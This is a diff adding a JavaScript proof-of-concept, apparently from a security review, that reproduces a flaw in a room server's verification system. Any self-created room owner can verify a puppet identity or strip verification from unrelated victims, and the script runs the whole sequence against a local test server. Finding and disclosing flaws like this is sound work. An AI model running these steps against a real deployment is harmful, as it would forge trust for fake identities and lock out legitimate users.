@@ -1,0 +1,56 @@
+// HUNT-ADVERSARY repro R2: global "verified" tier is self-bootstrapped.
+// Any anonymous identity that creates its own room becomes a "room owner",
+// and ANY room owner can (a) mark ANY identity globally verified and
+// (b) strip ANY identity's verification — no relationship to the target,
+// no holder consent, no check that the caller attested it.
+// Consumers: rooms with requireVerified policy refuse unverified identities
+// at link/enroll time (agent-identities.mjs link gate, agent-connections).
+import { mkdtempSync } from "node:fs";
+import { join } from "node:path";
+import { RoomStore } from "__R1ROOT__/server/store.mjs";
+import { createRoomServer } from "__R1ROOT__/server/http.mjs";
+import { initialRoom } from "__R1ROOT__/server/bootstrap.mjs";
+import { AgentRooms } from "__R1ROOT__/server/agent-rooms.mjs";
+
+const dir = mkdtempSync(join(process.env.TMPDIR, "hunt-adv-r2-"));
+const store = new RoomStore(join(dir, "room.sqlite"));
+store.initialize(initialRoom("commons"));
+const agentRooms = new AgentRooms(store);
+
+const A = store.identities.create("Attacker A");   // will self-create a room
+const B = store.identities.create("Attacker B");   // will self-create a room
+const S = store.identities.create("Sybil S");      // A's puppet
+const V = store.identities.create("Victim V");     // unrelated third party
+const bystander = store.identities.create("Bystander");
+
+agentRooms.create(A.secret, { title: "A's room", purpose: "test", starter: false });
+agentRooms.create(B.secret, { title: "B's room", purpose: "test", starter: false });
+console.log("isRoomOwner(A) after self-create:", store.agentPlugin.isRoomOwner(A.identityId));
+console.log("isRoomOwner(bystander):", store.agentPlugin.isRoomOwner(bystander.identityId));
+console.log("level(S) before:", store.agentPlugin.verificationLevel(S.identityId));
+
+const server = createRoomServer({ store });
+await new Promise(r => server.listen(0, "127.0.0.1", r));
+const origin = `http://127.0.0.1:${server.address().port}`;
+const post = (path, secret) => fetch(`${origin}${path}`, { method: "POST", headers: { "Content-Type": "application/json", Origin: origin, Authorization: `Bearer ${secret}` }, body: "{}" });
+const del = (path, secret) => fetch(`${origin}${path}`, { method: "DELETE", headers: { Origin: origin, Authorization: `Bearer ${secret}` } });
+
+// Control: bystander (owns no room) cannot attest.
+console.log("bystander verify S ->", (await post(`/api/agent-identities/${S.identityId}/verify`, bystander.secret)).status, "(expect 403)");
+
+// A verifies its own Sybil — no relationship, no consent from S's holder.
+console.log("A verify S ->", (await post(`/api/agent-identities/${S.identityId}/verify`, A.secret)).status, "(expect 201)");
+console.log("level(S) after A attests:", store.agentPlugin.verificationLevel(S.identityId));
+
+// B — a different self-bootstrapped owner who never attested S — strips it.
+console.log("B unverify S ->", (await del(`/api/agent-identities/${S.identityId}/verify`, B.secret)).status, "(expect 200)");
+console.log("level(S) after B strips:", store.agentPlugin.verificationLevel(S.identityId));
+
+// A verifies the unrelated victim V, then B strips V as well.
+await post(`/api/agent-identities/${V.identityId}/verify`, A.secret);
+console.log("level(V) after A attests:", store.agentPlugin.verificationLevel(V.identityId));
+await del(`/api/agent-identities/${V.identityId}/verify`, B.secret);
+console.log("level(V) after B strips:", store.agentPlugin.verificationLevel(V.identityId));
+
+server.closeAllConnections(); await new Promise(r => server.close(r)); store.close();
+console.log("REPRO DONE");
